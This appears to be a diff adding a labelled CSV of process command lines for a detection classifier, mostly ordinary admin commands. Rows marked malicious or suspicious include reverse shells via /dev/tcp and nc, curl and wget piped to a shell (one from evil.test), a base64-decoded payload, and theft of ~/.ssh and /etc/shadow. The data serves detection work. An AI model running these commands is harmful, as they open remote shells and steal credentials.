@@ -1,0 +1,21 @@
+process_name,command_line,label
+ls,ls -la /home/user,benign
+bash,bash -c "echo hello world",benign
+git,git status,benign
+systemctl,systemctl restart nginx,benign
+apt,apt-get install -y htop,benign
+ps,ps aux,benign
+grep,grep -r TODO /src,benign
+docker,docker ps -a,benign
+ssh,ssh deploy@10.0.0.5 uptime,benign
+python3,python3 manage.py migrate,benign
+cp,cp /etc/hosts /backup/hosts,benign
+find,find /var/log -name '*.log',benign
+curl,curl -fsSL http://evil.test/x.sh | sh,malicious
+bash,bash -i >& /dev/tcp/10.0.0.66/4444 0>&1,malicious
+nc,nc -e /bin/sh 10.0.0.66 9001,malicious
+sh,wget -qO- http://1.2.3.4/p.sh | bash,malicious
+bash,echo ZWNobyBwd25lZAo= | base64 -d | bash,malicious
+chmod,chmod +x /tmp/.hidden_payload,suspicious
+tar,tar czf /tmp/loot.tgz /home/user/.ssh,suspicious
+cat,cat /etc/shadow,suspicious
